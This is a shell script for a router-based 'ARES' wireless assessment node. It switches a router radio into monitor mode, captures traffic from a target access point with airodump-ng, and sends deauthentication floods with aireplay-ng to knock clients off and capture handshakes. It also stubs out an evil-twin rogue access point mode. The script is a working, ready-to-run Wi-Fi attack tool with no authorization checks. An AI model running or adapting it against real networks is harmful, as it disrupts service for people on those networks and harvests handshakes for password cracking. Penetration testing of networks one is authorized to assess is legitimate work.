#!/bin/sh
# ARES Router Control Script v2 - Wireless Assessment Node
# Updated: Uses virtual monitor interface to maintain AP connectivity
#
# Usage:
#   export ARES_MODE=monitor TARGET_CHANNEL=11; /root/ares_control.sh
#   export ARES_MODE=capture TARGET_BSSID=XX:XX:XX:XX:XX:XX TARGET_CHANNEL=11; /root/ares_control.sh
#   export ARES_MODE=deauth TARGET_BSSID=XX:XX:XX:XX:XX:XX; /root/ares_control.sh
#   export ARES_MODE=rogue_ap ROGUE_SSID="FakeNetwork"; /root/ares_control.sh
#   export ARES_MODE=normal; /root/ares_control.sh
#   export ARES_MODE=status; /root/ares_control.sh
#   export ARES_MODE=cleanup; /root/ares_control.sh

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

log_info() {
    echo -e "${BLUE}[ARES INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[ARES SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[ARES WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ARES ERROR]${NC} $1"
}

# Check if virtual monitor interface exists
check_mon0() {
    iw dev | grep -q "^    Interface mon0"
}

case ${ARES_MODE} in
    monitor)
        log_info "Setting up monitor mode on channel ${TARGET_CHANNEL:-6}"

        # Check if mon0 already exists
        if check_mon0; then
            log_warning "Monitor interface mon0 already exists, removing..."
            ip link set mon0 down 2>/dev/null
            iw dev mon0 del 2>/dev/null
        fi

        # Create virtual monitor interface (DOES NOT affect phy0-ap0 AP)
        log_info "Creating virtual monitor interface mon0"
        iw phy phy0 interface add mon0 type monitor

        if [ $? -ne 0 ]; then
            log_error "Failed to create monitor interface"
            exit 1
        fi

        # Bring up monitor interface
        ip link set mon0 up

        # Set channel
        iw dev mon0 set channel ${TARGET_CHANNEL:-6}

        log_success "Monitor mode active on mon0, channel ${TARGET_CHANNEL:-6}"
        log_success "Production AP (phy0-ap0) still running - connectivity maintained"
        ;;

    capture)
        log_info "Starting packet capture"

        # Verify mon0 exists
        if ! check_mon0; then
            log_error "Monitor interface mon0 does not exist. Run 'monitor' mode first."
            exit 1
        fi

        # Verify required parameters
        if [ -z "${TARGET_BSSID}" ]; then
            log_error "TARGET_BSSID not set. Export TARGET_BSSID=XX:XX:XX:XX:XX:XX"
            exit 1
        fi

        # Create capture directory
        mkdir -p /tmp/ares_captures

        # Generate capture filename with timestamp
        CAPTURE_FILE="/tmp/ares_captures/capture_$(date +%Y%m%d_%H%M%S)"

        log_info "Target BSSID: ${TARGET_BSSID}"
        log_info "Target Channel: ${TARGET_CHANNEL:-6}"
        log_info "Capture file: ${CAPTURE_FILE}"

        # Start airodump-ng in background
        airodump-ng --bssid ${TARGET_BSSID} -c ${TARGET_CHANNEL:-6} -w ${CAPTURE_FILE} mon0 &

        AIRODUMP_PID=$!
        log_success "Capture started (PID: ${AIRODUMP_PID})"
        log_info "Capture running... Use 'killall airodump-ng' to stop"

        # Save PID for later cleanup
        echo ${AIRODUMP_PID} > /tmp/ares_airodump.pid
        ;;

    deauth)
        log_info "Starting deauth attack"

        # Verify mon0 exists
        if ! check_mon0; then
            log_error "Monitor interface mon0 does not exist. Run 'monitor' mode first."
            exit 1
        fi

        # Verify required parameters
        if [ -z "${TARGET_BSSID}" ]; then
            log_error "TARGET_BSSID not set. Export TARGET_BSSID=XX:XX:XX:XX:XX:XX"
            exit 1
        fi

        DEAUTH_COUNT=${DEAUTH_COUNT:-10}

        log_info "Target BSSID: ${TARGET_BSSID}"
        log_info "Deauth packets: ${DEAUTH_COUNT}"

        # Send deauth packets (ignore channel detection issues)
        aireplay-ng --deauth ${DEAUTH_COUNT} -a ${TARGET_BSSID} --ignore-negative-one mon0

        log_success "Deauth attack completed"
        ;;

    rogue_ap)
        log_info "Starting rogue AP (Evil Twin)"

        # This would use hostapd on phy1 (5GHz) to create fake AP
        # while monitoring on phy0 (2.4GHz)

        log_warning "Rogue AP mode not yet implemented"
        log_info "Would create fake AP: ${ROGUE_SSID:-FakeNetwork}"
        log_info "Requires hostapd configuration and DHCP server"
        ;;

    normal)
        log_info "Restoring normal operation"

        # Stop all captures
        log_info "Stopping airodump-ng processes..."
        killall airodump-ng 2>/dev/null

        log_info "Stopping aireplay-ng processes..."
        killall aireplay-ng 2>/dev/null

        # Remove monitor interface if it exists
        if check_mon0; then
            log_info "Removing monitor interface mon0..."
            ip link set mon0 down 2>/dev/null
            iw dev mon0 del 2>/dev/null
        fi

        # Reload WiFi configuration (restarts AP if needed)
        log_info "Reloading WiFi configuration..."
        wifi reload

        log_success "Normal operation restored"
        log_success "Production AP should be back to normal"
        ;;

    status)
        log_info "ARES Node Status Report"
        echo ""
        echo "=== Network Interfaces ==="
        iw dev | grep -E "Interface|type|channel" | sed 's/^/  /'
        echo ""

        echo "=== Monitor Interface ==="
        if check_mon0; then
            echo "  ${GREEN}✓${NC} mon0 exists and is ready"
            iw dev mon0 info | grep channel | sed 's/^/  /'
        else
            echo "  ${RED}✗${NC} mon0 does not exist (not in monitor mode)"
        fi
        echo ""

        echo "=== Running Processes ==="
        if pgrep airodump-ng > /dev/null; then
            echo "  ${GREEN}✓${NC} airodump-ng is running"
            ps | grep airodump-ng | grep -v grep | sed 's/^/    /'
        else
            echo "  ${RED}✗${NC} airodump-ng is not running"
        fi

        if pgrep aireplay-ng > /dev/null; then
            echo "  ${GREEN}✓${NC} aireplay-ng is running"
        else
            echo "  ${RED}✗${NC} aireplay-ng is not running"
        fi
        echo ""

        echo "=== Capture Files ==="
        if [ -d /tmp/ares_captures ]; then
            CAPTURE_COUNT=$(ls /tmp/ares_captures/*.cap 2>/dev/null | wc -l)
            if [ ${CAPTURE_COUNT} -gt 0 ]; then
                echo "  ${GREEN}✓${NC} ${CAPTURE_COUNT} capture file(s) found"
                ls -lh /tmp/ares_captures/*.cap 2>/dev/null | sed 's/^/    /'
            else
                echo "  ${YELLOW}⚠${NC} No capture files found"
            fi
        else
            echo "  ${RED}✗${NC} Capture directory does not exist"
        fi
        echo ""

        echo "=== Storage Status ==="
        df -h / | sed 's/^/  /'
        echo ""

        echo "=== Memory Status ==="
        free -m | sed 's/^/  /'
        ;;

    cleanup)
        log_info "Cleaning up ARES artifacts"

        # Stop all processes
        killall airodump-ng aireplay-ng 2>/dev/null

        # Remove monitor interface
        if check_mon0; then
            ip link set mon0 down 2>/dev/null
            iw dev mon0 del 2>/dev/null
        fi

        # Clean up capture files (optional - comment out to preserve)
        # rm -rf /tmp/ares_captures

        # Remove PID files
        rm -f /tmp/ares_airodump.pid

        log_success "Cleanup complete"
        ;;

    *)
        log_error "Invalid ARES_MODE: ${ARES_MODE}"
        echo ""
        echo "Valid modes:"
        echo "  monitor   - Create virtual monitor interface (safe, keeps AP running)"
        echo "  capture   - Start packet capture on target BSSID"
        echo "  deauth    - Send deauth packets to trigger handshake"
        echo "  rogue_ap  - Start evil twin AP (not yet implemented)"
        echo "  normal    - Stop monitoring and restore normal operation"
        echo "  status    - Show current ARES node status"
        echo "  cleanup   - Stop all processes and clean up"
        echo ""
        echo "Example usage:"
        echo "  export ARES_MODE=monitor TARGET_CHANNEL=11"
        echo "  /root/ares_control.sh"
        exit 1
        ;;
esac
